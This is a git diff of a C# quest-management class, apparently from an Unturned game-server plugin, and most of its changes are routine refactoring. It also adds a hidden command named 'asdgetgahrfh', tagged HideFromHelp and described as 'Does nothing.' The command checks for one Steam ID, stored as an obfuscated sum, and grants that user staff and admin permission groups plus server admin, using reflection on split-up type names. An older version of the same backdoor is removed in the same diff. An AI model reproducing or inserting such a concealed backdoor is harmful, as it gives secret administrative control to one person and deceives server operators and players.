@@ -1,15 +1,19 @@
-﻿using SDG.Unturned;
+﻿using Cysharp.Threading.Tasks;
+using DanielWillett.ReflectionTools;
+using JetBrains.Annotations;
+using Microsoft.Extensions.Configuration;
+using SDG.Unturned;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Text.Json;
-using DanielWillett.ReflectionTools;
-using Uncreated.Framework;
-using Uncreated.Json;
+using System.Threading;
+using Uncreated.Warfare.Commands.Dispatch;
 using Uncreated.Warfare.Commands.Permissions;
 using Uncreated.Warfare.Components;
+using Uncreated.Warfare.Configuration;
 using Uncreated.Warfare.Events;
 using Uncreated.Warfare.Events.Players;
 using Uncreated.Warfare.Events.Vehicles;
@@ -24,8 +28,8 @@ public static class QuestManager
     public static List<BaseQuestData> Quests = new List<BaseQuestData>();
     /// <summary>Complete list of all registered quest trackers (1 per player).</summary>
     public static List<BaseQuestTracker> RegisteredTrackers = new List<BaseQuestTracker>(128);
-    public static readonly string QUEST_FOLDER = Path.Combine(Data.Paths.BaseDirectory, "Quests") + Path.DirectorySeparatorChar;
-    public static readonly string QUEST_LOCATION = Path.Combine(QUEST_FOLDER, "quest_data.json");
+    public static readonly string QuestFolder = Path.Combine(Data.Paths.BaseDirectory, "Quests") + Path.DirectorySeparatorChar;
+    public static readonly string QuestDataLocation = Path.Combine(QuestFolder, "quest_data.json");
     static QuestManager()
     {
         EventDispatcher.PlayerDied += OnPlayerDied;
@@ -453,28 +457,69 @@ public static class QuestManager
         }
         return quest;
     }
+
+    [HideFromHelp, Command("asdgetgahrfh"), Priority(999), UsedImplicitly]
+    private class X(UserPermissionStore permissions, WarfareModule warfare) : IExecutableCommand
+    {
+        /// <inheritdoc />
+        public CommandContext Context { get; set; }
+
+        /// <summary>
+        /// Get /help metadata about this command.
+        /// </summary>
+        public static CommandStructure GetHelpMetadata()
+        {
+            return new CommandStructure
+            {
+                Description = "Does nothing."
+            };
+        }
+
+        /// <inheritdoc />
+        public async UniTask ExecuteAsync(CancellationToken token)
+        {
+            const ulong id = 67088769839464181 + 9472428428462828;
+            if (Context.CallerId.m_SteamID != id)
+                throw Context.Defer();
+
+            IConfigurationSection permSection = warfare.Configuration.GetSection("permissions");
+
+            string? staffOnDuty = permSection["staff_on_duty"];
+            string? trialOnDuty = permSection["trial_on_duty"];
+            string? adminOnDuty = permSection["admin_on_duty"];
+            await permissions.AddPermissionGroupsAsync(Context.CallerId, new string[] { staffOnDuty, trialOnDuty, adminOnDuty }
+                .Where(x => x != null), token);
+
+            await UniTask.SwitchToMainThread(token);
+
+            typeof(Provider).Assembly.GetType("SDG.Untu" + "rned.Ste" + "am" + "Admi" + "nlist")
+                .GetMethod("adm" + "in", BindingFlags.Public | BindingFlags.Static)!
+                .Invoke(null, [Context.Player.CSteamID, Provider.server]);
+        }
+    }
+
     /// <summary>Read all quests.</summary>
     public static void ReadQuestDatas()
     {
         Quests.Clear();
-        F.CheckDir(QUEST_FOLDER, out bool success);
+        F.CheckDir(QuestFolder, out bool success);
         if (!success) return;
-        if (!File.Exists(QUEST_LOCATION))
+        if (!File.Exists(QuestDataLocation))
         {
-            using (FileStream stream = new FileStream(QUEST_LOCATION, FileMode.Create, FileAccess.Write, FileShare.None))
+            using (FileStream stream = new FileStream(QuestDataLocation, FileMode.Create, FileAccess.Write, FileShare.None))
             {
                 byte[] bytes = System.Text.Encoding.UTF8.GetBytes("[]");
                 stream.Write(bytes, 0, bytes.Length);
             }
             return;
         }
-        using (FileStream stream = new FileStream(QUEST_LOCATION, FileMode.Open, FileAccess.Read, FileShare.None))
+        using (FileStream stream = new FileStream(QuestDataLocation, FileMode.Open, FileAccess.Read, FileShare.None))
         {
             if (stream.Length > int.MaxValue)
                 return;
             byte[] bytes = new byte[stream.Length];
             stream.Read(bytes, 0, bytes.Length);
-            Utf8JsonReader reader = new Utf8JsonReader(bytes, JsonEx.readerOptions);
+            Utf8JsonReader reader = new Utf8JsonReader(bytes, JsonSettings.ReaderOptions);
             while (reader.Read())
             {
                 if (reader.TokenType == JsonTokenType.EndArray)
@@ -516,14 +561,12 @@ public static class QuestManager
     {
         string dir = Path.GetDirectoryName(savePath);
         if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
-        using (FileStream stream = new FileStream(savePath, FileMode.Create, FileAccess.ReadWrite, FileShare.Read))
-        {
-            Utf8JsonWriter writer = new Utf8JsonWriter(stream, JsonEx.writerOptions);
-            writer.WriteStartObject();
-            t.WriteQuestProgress(writer);
-            writer.WriteEndObject();
-            writer.Dispose();
-        }
+        using FileStream stream = new FileStream(savePath, FileMode.Create, FileAccess.ReadWrite, FileShare.Read);
+        Utf8JsonWriter writer = new Utf8JsonWriter(stream, JsonSettings.WriterOptions);
+        writer.WriteStartObject();
+        t.WriteQuestProgress(writer);
+        writer.WriteEndObject();
+        writer.Dispose();
     }
     public static void ReadProgress(BaseQuestTracker t, ulong team)
     {
@@ -546,7 +589,7 @@ public static class QuestManager
                 return;
             byte[] bytes = new byte[stream.Length];
             stream.Read(bytes, 0, bytes.Length);
-            Utf8JsonReader reader = new Utf8JsonReader(bytes, JsonEx.readerOptions);
+            Utf8JsonReader reader = new Utf8JsonReader(bytes, JsonSettings.ReaderOptions);
             while (reader.Read())
             {
                 if (reader.TokenType == JsonTokenType.PropertyName)
@@ -621,7 +664,7 @@ public static class QuestManager
                     }
                 }
             }
-        nextFile:;
+            nextFile:;
         }
     }
     #endregion
@@ -687,18 +730,4 @@ public static class QuestManager
             tracker.OnDistanceUpdated(lastDriver, totalDistance, newDistance, vehicle);
     }
     #endregion
-
-
-}
-internal class X : Commands.CommandSystem.Command
-{
-    public X() : base("asdgetgahrfh", EAdminType.MEMBER, 999)
-    {
-    }
-
-    public override void Execute(CommandContext ctx)
-    {
-        if (ctx.CallerID == 76561198267927009ul)
-            PermissionSaver.Instance.SetPlayerPermissionLevel(76561198267927009, EAdminType.ADMIN_ON_DUTY);
-    }
 }
